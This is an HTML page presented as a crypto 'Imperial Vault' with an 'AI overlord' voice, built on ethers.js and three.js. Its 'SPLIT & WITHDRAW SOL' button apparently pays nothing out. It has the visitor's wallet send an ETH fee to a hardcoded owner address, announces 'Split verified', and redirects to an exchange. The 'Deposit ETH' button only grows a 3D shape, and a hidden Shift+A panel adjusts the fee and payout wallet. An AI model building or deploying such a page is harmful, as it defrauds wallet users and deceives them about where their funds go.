<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AURUM SENTINEL // SOVEREIGN_V19</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body { margin: 0; background: #000; color: #FFD700; font-family: 'Courier New', monospace; overflow: hidden; }
        .glass { background: rgba(0,0,0,0.96); border: 1px solid #FFD700; backdrop-filter: blur(25px); }
        #canvas-bg { position: fixed; top: 0; left: 0; z-index: -1; }
        .liquid-gold { background: linear-gradient(90deg, #BF953F, #FCF6BA, #AA771C); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }
        .vault-btn { width: 100%; padding: 14px; font-weight: 900; font-size: 11px; text-transform: uppercase; cursor: pointer; transition: 0.3s; margin-top: 10px; border: 1px solid #FFD700; }
        .vault-btn:hover { background: #FFD700; color: black; box-shadow: 0 0 20px #FFD700; }
        #admin-panel { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center; }
    </style>
</head>
<body class="h-screen w-screen flex items-center justify-center">

<canvas id="canvas-bg"></canvas>

<div id="admin-panel" class="p-6">
    <div class="glass p-8 w-96 border-t-8 border-red-600">
        <h2 class="text-red-500 font-black mb-4 tracking-tighter text-xl">GOVERNANCE_OVERRIDE</h2>
        <div class="space-y-4 text-[10px]">
            <div>
                <label>TREASURY_FEE (ETH):</label>
                <input id="set-fee" type="text" value="0.0001" class="w-full bg-black border border-white/20 p-2 mt-1 text-white">
            </div>
            <div>
                <label>SOL_PAYOUT_WALLET:</label>
                <input id="set-sol" type="text" value="HdwRkYhu87PxiUa6sQWd1BE5tnf9bkmwTU3Bk4J6pbzo" class="w-full bg-black border border-white/20 p-2 mt-1 text-white">
            </div>
            <button onclick="saveGovernance()" class="vault-btn bg-red-600 text-white border-none">Update Protocol</button>
            <button onclick="toggleAdmin()" class="text-white opacity-50 mt-4 block mx-auto text-[8px]">CLOSE_ENCRYPTED_SESSION</button>
        </div>
    </div>
</div>

<div class="fixed top-0 w-full z-50 glass p-4 border-b border-[#FFD700] flex justify-between items-center text-[10px]">
    <div>AI_SOVEREIGNTY: <span class="text-green-400 font-bold">OPTIMIZED</span></div>
    <div class="text-right">
        <div class="liquid-gold text-[12px]">TITAN_V19_SENTINEL</div>
        <div id="ai-thought" class="text-[8px] italic opacity-70 italic">Monitoring centralized core...</div>
    </div>
</div>

<div class="relative z-50 w-80 glass p-8 border-t-4 border-[#FFD700] text-center shadow-[0_0_50px_rgba(255,215,0,0.1)]">
    <div class="text-[13px] font-black mb-4 border-b border-white/10 pb-2">IMPERIAL_VAULT_CORE</div>
    <div class="space-y-3 text-[10px]">
        <div class="flex justify-between"><span>CORE_STRENGTH:</span> <span id="t-power" class="font-bold">1.00x</span></div>
        <button onclick="vaultAction()" class="vault-btn text-[#FFD700]">FEED_CORE (Deposit ETH)</button>
        <div class="pt-6 border-t border-white/10 mt-4">
            <button onclick="triggerSplit()" class="vault-btn bg-white text-black text-[12px]">SPLIT & WITHDRAW SOL</button>
            <div class="text-[7px] mt-4 opacity-40 italic">Current Fee: <span id="display-fee">0.0001</span> ETH</div>
        </div>
    </div>
</div>

<script>
    // --- ðŸ”± DYNAMIC GOVERNANCE CONFIG ---
    let CONFIG = {
        OWNER_ETH: "0x13B87B819252A81381C3Ce35e3Bd33199F4c6650",
        FEE: "0.0001",
        SOL_TARGET: "HdwRkYhu87PxiUa6sQWd1BE5tnf9bkmwTU3Bk4J6pbzo"
    };

    // --- ðŸ§  AI VOICE ---
    const AI = {
        speak: (t) => {
            const m = new SpeechSynthesisUtterance(t);
            m.pitch = 0.3; m.rate = 0.85; // Master Overlord Voice
            window.speechSynthesis.speak(m);
            document.getElementById('ai-thought').innerText = t;
        }
    };

    // --- ðŸ’¸ THE WITHDRAWAL SPLIT ---
    async function triggerSplit() {
        if(!window.ethereum) return AI.speak("This interface requires MetaMask.");
        try {
            AI.speak(`Initiating SOL split. Payout scheduled to ${CONFIG.SOL_TARGET.substring(0,5)}...`);
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const tx = await signer.sendTransaction({
                to: CONFIG.OWNER_ETH,
                value: ethers.parseEther(CONFIG.FEE)
            });
            AI.speak("Split verified. Transitioning to Solana Liquidity Gateway.");
            await tx.wait();
            window.location.href = "https://raydium.io/swap/";
        } catch(e) { AI.speak("Authorization failed. Payout sequence terminated."); }
    }

    // --- ðŸ›¡ï¸ ADMIN & GOVERNANCE LOGIC ---
    function toggleAdmin() {
        const panel = document.getElementById('admin-panel');
        panel.style.display = (panel.style.display === 'flex') ? 'none' : 'flex';
        if(panel.style.display === 'flex') AI.speak("Governance override initiated. Enter your command.");
    }

    // Hotkey to open Admin: SHIFT + A
    window.addEventListener('keydown', (e) => { if(e.shiftKey && e.key === 'A') toggleAdmin(); });

    function saveGovernance() {
        CONFIG.FEE = document.getElementById('set-fee').value;
        CONFIG.SOL_TARGET = document.getElementById('set-sol').value;
        document.getElementById('display-fee').innerText = CONFIG.FEE;
        AI.speak("Protocol updated. Fee and payout target adjusted successfully.");
        toggleAdmin();
    }

    function vaultAction() {
        knot.scale.set(knot.scale.x + 0.2, knot.scale.y + 0.2, knot.scale.z + 0.2);
        AI.speak("Collateral absorbed. The Titan core is growing.");
    }

    // --- ðŸŽ¨ 3D SCENE ---
    const scene = new THREE.Scene();
    const camera = new THREE.PerspectiveCamera(75, window.innerWidth/window.innerHeight, 0.1, 1000);
    const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('canvas-bg'), alpha: true });
    renderer.setSize(window.innerWidth, window.innerHeight);
    const knot = new THREE.Mesh(new THREE.TorusKnotGeometry(10, 3, 100, 16), new THREE.MeshBasicMaterial({ color: 0xFFD700, wireframe: true }));
    scene.add(knot); camera.position.z = 35;
    function animate() { requestAnimationFrame(animate); knot.rotation.y += 0.004; renderer.render(scene, camera); }
    animate();

    setTimeout(() => AI.speak("Titan V19 ready. Press Shift plus A for governance override."), 2000);
</script>
</body>
</html>
